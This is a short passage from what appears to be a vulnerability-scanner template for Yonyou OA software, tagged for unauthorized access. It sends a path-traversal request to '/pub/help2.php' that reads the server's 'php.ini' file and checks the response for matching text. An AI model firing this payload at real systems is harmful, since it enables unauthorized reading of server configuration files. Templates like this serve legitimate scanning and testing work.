  tags: unauthorized,OA,yonyou,hw

http:
  - method: GET
    path:
      - "{{RootURL}}/pub/help2.php?key=/../../apache/php.ini"
    matchers:
      - type: word
        part: body
        words:
          - 无效的授权说明
          - About php.ini
          - Database error
        condition: and
